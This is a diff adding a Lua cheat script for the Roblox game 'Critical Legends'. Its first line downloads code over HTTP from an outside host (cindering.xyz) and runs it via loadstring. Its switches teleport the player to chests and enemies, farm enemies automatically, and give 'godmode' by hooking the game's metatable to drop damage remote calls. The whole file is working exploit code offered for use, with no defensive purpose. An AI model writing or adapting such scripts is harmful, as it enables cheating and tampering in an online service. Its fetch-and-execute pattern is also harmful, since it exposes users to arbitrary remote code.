@@ -1,0 +1,96 @@
+local lib = loadstring(game:HttpGet("http://cindering.xyz/message.txt"))()
+
+
+local Window = lib:AddWindow('Critical Legends')
+
+local tab1 = Window:AddTab("Main")
+
+local rootpart = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+
+local region = {}
+for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
+    table.insert(region,v)
+end
+
+
+
+
+
+tab1:AddSwitch("Auto Chests",function(value)
+    chest = value
+    while chest do wait(0.1)
+        for i,v in pairs(game:GetService("Workspace").Chests:GetChildren()) do
+            if not v:FindFirstChildOfClass("IntValue") then
+            rootpart.CFrame = CFrame.new(v.Giver.Position)
+            wait()
+            end
+        end
+    end
+end)
+
+tab1:AddSwitch("Auto Tp to Damage Sword Thing",function(value)
+    tog2 = value
+    while tog2 do wait()
+    for i,v in pairs(game:GetService("Workspace").CombatFolder[game.Players.LocalPlayer.Name]:GetChildren()) do
+        if v.Name == "SwordOrb" then
+            rootpart.CFrame = CFrame.new(v.HitBox.Position)
+            end
+        end
+    end
+end)
+
+
+tab1:AddSwitch("Godmode",function(value)
+ god = value
+ if god == true then
+ local mt = getrawmetatable(game)
+setreadonly(mt,false)
+
+local old = mt.__namecall
+
+mt.__namecall = newcclosure(function(self,...)
+    local args = {...}
+    local method = getnamecallmethod()
+    if not checkcaller() and self.Name == "Damage" and args[3] ~= nil and method == "FireServer" then
+        return
+    end
+    return old(self,...)
+        end)
+ end  
+end)
+
+local dropdown = tab1:AddDropdown("Select Region",function(selected)
+    enemy = selected
+end)
+
+for i = 1,#region do
+    dropdown:Add(region[i])
+end
+
+
+
+
+
+tab1:AddSwitch("Autofarm",function(value)
+    autofarm = value
+        while autofarm  do wait()
+        if not workspace:FindFirstChild("CombatFolder")  then
+            for i,v in pairs(workspace.Enemies[tostring(enemy)]:GetChildren()) do
+                if v.Name == "Enemy" and v.InCombat.Value == false then
+            rootpart.CFrame = v.EnemyLocation.CFrame + Vector3.new(5,0,0)
+            v.CombatTrigger:FireServer("Solo")
+            end
+        end
+    end
+    spawn(function()
+        if workspace:FindFirstChild("CombatFolder") and autofarm then
+                for i,v in pairs(game:GetService("Workspace").CombatFolder[game.Players.LocalPlayer.Name]:GetChildren()) do
+        if v.Name == "SwordOrb" then
+            rootpart.CFrame = CFrame.new(v.HitBox.Position)
+                    end
+                end
+            end
+        end)
+    end
+end)
